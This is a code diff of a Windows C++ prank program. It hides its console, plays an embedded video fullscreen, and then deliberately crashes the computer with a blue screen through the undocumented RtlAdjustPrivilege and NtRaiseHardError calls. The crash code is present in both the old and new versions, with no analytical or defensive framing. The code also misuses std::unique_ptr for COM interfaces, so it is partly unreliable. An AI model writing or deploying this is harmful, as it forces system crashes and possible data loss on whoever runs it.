@@ -2,73 +2,70 @@
 #include <dshow.h>
 #include <memory>
 
-// Externs for BSoD stuff
+// externs for BSoD stuff
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
 
-// Smart pointers for DirectShow interfaces
+// smart pointers for DirectShow interfaces
 std::unique_ptr<IGraphBuilder> graph;
 std::unique_ptr<IMediaControl> control;
 std::unique_ptr<IMediaEvent> event;
 std::unique_ptr<IVideoWindow> window;
 
-// Function to trigger BSoD
-ULONG TriggerBSOD() {
+// functions
+void TriggerBSOD() {
+    // initialize variables
     BOOLEAN state;
     ULONG response;
 
-    RtlAdjustPrivilege(19, TRUE, FALSE, &state); // Adjust privileges
-    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response); // Raise BSoD
-
-    return response;
+    // adjust privileges and raise a BSoD
+    RtlAdjustPrivilege(19, TRUE, FALSE, &state);
+    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response);
 }
 
-// Function to get the video resource
-void GetVideoResource(LPWSTR* path) {
-    // Get the video resource
+int GetVideoResource(LPWSTR* path) {
+    // get the video resource handle
     HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
 
-    if (resource == NULL) {
-        TriggerBSOD(); // If resource not found, trigger BSoD
-    }
-
-    // Get resource data
+    // get resource data
     DWORD size = SizeofResource(NULL, resource);
     LPVOID data = LockResource(LoadResource(NULL, resource));
 
     if (data == NULL) {
-        TriggerBSOD(); // If resource data not retrieved, trigger BSoD
+        return 1; // return if the resource data is null
     }
 
-    // Create temporary file path
+    // create a temporary file path
     *path = new WCHAR[MAX_PATH];
 
     GetTempPathW(MAX_PATH, *path);
     StringCbCatW(*path, MAX_PATH, L"video.wmv");
 
-    // Create and write to the temporary file
+    // create and write resource data to the temporary file
     HANDLE file = CreateFileW(*path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     DWORD written;
 
     if (file == INVALID_HANDLE_VALUE) {
-        TriggerBSOD(); // If file creation failed, trigger BSoD
+        return 1; // return if the file handle is invalid
     }
 
     if (!WriteFile(file, data, size, &written, NULL) || written != size) {
-        TriggerBSOD(); // If writing to file failed, trigger BSoD
+        return 1; // return if the file write fails
     }
 
-    // Close the file handle and free the resource
+    // close the file handle and free the resource
     CloseHandle(file);
     FreeResource(resource);
+
+    // do the required return
+    return 0;
 }
 
-// Function to initialize DirectShow
 void InitializeDirectShow(LPCWSTR path) {
-    // Initialize COM
+    // initialize the COM library
     CoInitialize(NULL);
 
-    // Create DirectShow objects
+    // create DirectShow objects
     graph.reset();
     control.reset();
     event.reset();
@@ -80,33 +77,43 @@ void InitializeDirectShow(LPCWSTR path) {
     graph->QueryInterface(IID_IMediaEvent, (void**)&event);
     graph->QueryInterface(IID_IVideoWindow, (void**)&window);
 
-    // Render the video file
+    // render the video file
     graph->RenderFile(path, NULL);
 
-    // Set video window to full screen mode
+    // set DirectShow to full screen mode
     window->put_FullScreenMode(OATRUE);
 }
 
+// main stuff
 int main() {
+    // initialize variables
     LPWSTR path;
     
     HRESULT result;
 	LONG code;
 
-    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide console window
+    // hide the console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    GetVideoResource(&path); // Get the video resource
-    InitializeDirectShow(path); // Initialize DirectShow
+    // get the video resource
+    if (GetVideoResource(&path) == 1) {
+        TriggerBSOD(); // trigger a BSoD if getting the video fails
+    }
 
-    result = control->Run(); // Play the video
+    // initialize DirectShow
+    InitializeDirectShow(path);
 
+    // play the video
+    result = control->Run();
+
+    // wait for the video to finish playing
 	if (SUCCEEDED(result)) {
-		event->WaitForCompletion(INFINITE, &code); // Wait for the video to finish
+		event->WaitForCompletion(INFINITE, &code);
 	}
 
-    // Trigger BSoD after attempting to play the video
+    // trigger a BSoD
     TriggerBSOD();
 
-    // In case BSoD fails, return 1
+    // return 1 in case of failure
     return 1;
 }
